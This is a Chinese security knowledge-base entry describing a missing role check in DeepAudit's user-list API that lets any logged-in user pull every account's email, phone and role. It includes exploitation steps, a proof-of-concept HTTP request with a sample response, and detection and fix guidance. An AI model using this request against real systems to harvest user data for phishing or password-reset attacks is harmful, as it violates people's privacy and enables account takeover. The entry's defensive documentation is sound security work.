---
id: web-generic-auth-deepaudit-user-list-missing-role-check-pii-leak
title: DeepAudit 用户列表接口只校验登录不校验角色：普通用户拉取全量账号邮箱/手机号
type: scenario
domain: web
path: web/generic/auth
technique: deepaudit-user-list-missing-role-check-pii-leak
tags:
- web
- auth
- authz
- broken-access-control
- idor
- pii
- python
- fastapi
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V164
  verified_at: '2026-11-06T09:59:41+08:00'
  notes: 已对照原文 4.2 漏洞(2.1) 与图 09 核对：read_users 仅 Depends(deps.get_current_user) 未校验 superuser、select(User) 全表分页/search/role/is_active，响应含 email/is_superuser/full_name/phone/role/id，普通账号 GET /api/v1/users/ 返回 200 与两条用户记录，均一致；DeepAudit 3.0.4 为目标环境版本、原文未给受影响区间，不设 affected_versions。未验证点：未在本机复跑请求；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-deepaudit-user-list-missing-role-check-pii-leak/
draft: false
kb_aliases:
- DeepAudit 用户列表越权
- read_users 越权
- 普通用户获取全部用户
- 用户信息泄露
- 仅 get_current_user 未校验 superuser
---

## 一句话结论

DeepAudit 的 `GET /api/v1/users/` 只依赖 `deps.get_current_user` 校验“是否登录”，没有校验调用者是否为管理员；任意注册用户都能拉取全量用户列表，响应包含邮箱、姓名、手机号、角色与 `is_superuser` 等敏感字段，形成账号枚举与 PII 泄露。

## 原理

- 该接口的依赖是 `current_user: User = Depends(deps.get_current_user)`，而创建/更新/删除用户接口用的是 `deps.get_current_active_superuser`。两者权限级别不同：前者只证明 JWT 有效，后者才证明是启用的超级管理员。
- 查询逻辑没有按 `current_user.id`、租户或角色做数据范围过滤：`select(User)` 直接全表查询，`search`/`role`/`is_active` 只是可选筛选条件，不构成授权。
- 返回的 `UserSchema`/`UserListResponse` 包含 `email`、`full_name`、`phone`、`role`、`is_active`、`is_superuser`、`id`、`created_at` 等字段；攻击者可以借此枚举管理员邮箱、手机号，为撞库、钓鱼、密码重置攻击提供目标。
- 根因：把“认证（authentication）”当成了“授权（authorization）”；接口命名是“获取用户列表”，开发时默认只有后台管理员会调用，但前端路由/菜单隐藏并不能阻止直接请求 API。

## 触发条件

- 目标 DeepAudit 允许自助注册（文章中的实例可以注册普通账号），或攻击者已拥有任意低权限账号。
- `GET /api/v1/users/` 路由存在且按文章版本使用 `get_current_user` 而非 `get_current_active_superuser`。
- 返回体中包含用户敏感字段（邮箱、手机号等）。
- 攻击者能直接访问 API（绕过前端菜单限制）。

## 利用步骤

1. 注册或登录一个普通账号，获取 Bearer Token。
2. 直接请求用户列表接口，忽略前端是否显示“用户管理”菜单：
   ```http
   GET /api/v1/users/?skip=0&limit=100 HTTP/1.1
   Host: target
   Authorization: Bearer <普通用户 token>
   Accept: application/json
   ```
3. 解析响应中的 `users` 数组，收集 `email`、`full_name`、`phone`、`role`、`is_superuser`。
4. 用 `search=` 参数按关键字筛选（如 `admin`、`@company.com`），或分页 `skip`/`limit` 拉全量。
5. 将收集到的管理员邮箱/手机号用于后续钓鱼、撞库或密码重置攻击；若发现 `is_superuser: true` 的账号，优先作为目标。

## PoC

```http
GET /api/v1/users/ HTTP/1.1
Host: 10.8.2.50:3020
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
User-Agent: Mozilla/5.0
Connection: close
```

```json
{
  "users": [
    {
      "email": "newuser@example.com",
      "is_active": true,
      "is_superuser": false,
      "full_name": "...",
      "phone": "...",
      "role": "member",
      "id": "....",
      "created_at": "2026-01-30T05:25:30.409571Z"
    },
    {
      "email": "123456@qq.com",
      "is_active": true,
      "is_superuser": false,
      "full_name": "hack",
      "phone": null,
      "role": "member",
      "id": "b3bb3f40-4fda-4ec0-9ddf-d49e7bad895a"
    }
  ],
  "total": 2,
  "skip": 0,
  "limit": 20
}
```

## 变体与关联

- 同类缺陷：`GET /api/v1/projects/`、任务列表、审计报告列表等如果只用 `get_current_user` 而不按 `owner_id` 过滤，也会造成跨用户数据泄露。
- 若列表接口不返回手机号，但详情接口 `GET /users/{id}` 也只校验登录，可先用列表拿 ID 再逐个取详情。
- 关联：[[web-generic-auth-authlog-userid-enumeration-authz-bypass]]（低权限接口泄露 userId 后绕过对象级校验）、[[web-generic-auth-mobile-person-permission-userid-idor-pii]]（PII 枚举类越权）。
- 边界：如果目标关闭了自助注册、或该版本已把列表接口改为 `get_current_active_superuser`，则需要先通过其他方式拿到低权限账号；前端菜单隐藏不影响直接请求 API。

## 检测与防御

- 检测：审计所有返回用户/项目/任务列表的路由，确认依赖是 `get_current_active_superuser` 还是仅 `get_current_user`；对普通用户 token 请求 `/api/v1/users/` 做告警；检查响应中是否包含手机号、邮箱等 PII。
- 修复：列表接口改为管理员专用（`get_current_active_superuser`）；若业务需要普通用户搜索，则只返回脱敏后的最小字段，并按 `current_user` 做数据范围过滤。
- 加固：统一在 API 层做 RBAC/对象级授权，不依赖前端菜单隐藏；对 PII 字段做脱敏与访问审计；注册接口增加邮箱验证/邀请制，降低批量注册枚举的可能。
